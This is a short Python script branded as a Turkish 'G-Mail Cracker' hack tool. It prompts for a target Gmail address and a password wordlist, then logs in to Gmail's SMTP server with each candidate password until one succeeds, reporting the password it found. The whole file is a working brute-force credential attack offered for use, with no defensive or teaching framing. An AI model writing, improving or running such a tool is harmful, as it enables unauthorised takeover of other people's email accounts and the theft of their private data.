import smtplib
print("""

        --Turkish Hack Tools--

   _______                               __   __      _______                         __                   
 |   _   |  ______  .--------. .---.-. |__| |  |    |   _   | .----. .---.-. .----. |  |--. .-----. .----.
 |.  |___| |______| |        | |  _  | |  | |  |    |.  1___| |   _| |  _  | |  __| |    <  |  -__| |   _|
 |.  |   |          |__|__|__| |___._| |__| |__|    |.  |___  |__|   |___._| |____| |__|__| |_____| |__|  
 |:  1   |                                          |:  1   |                                             
 |::.. . |                                          |::.. . |                                             
 `-------'                                          `-------'                                             
                                                                                      Coded By Emyounoone                    """)

mail = str(input("\n\n\n\nHedef G-Mail : "))
print("Brute Force Saldırısı İçin Hedef:"+mail)
smtp = smtplib.SMTP("smtp.gmail.com", 587)
smtp.ehlo()
smtp.starttls()
wl = str(input("World List İsmi :"))
opf = open(wl,"r",encoding="utf-8")
print("")
for password in opf:
  try:
   smtp.login(mail, password)
   print("Şifre Bulundu: "+password)
   input("")
   break
  except smtplib.SMTPAuthenticationError:
   print("Denenen "+password)
   
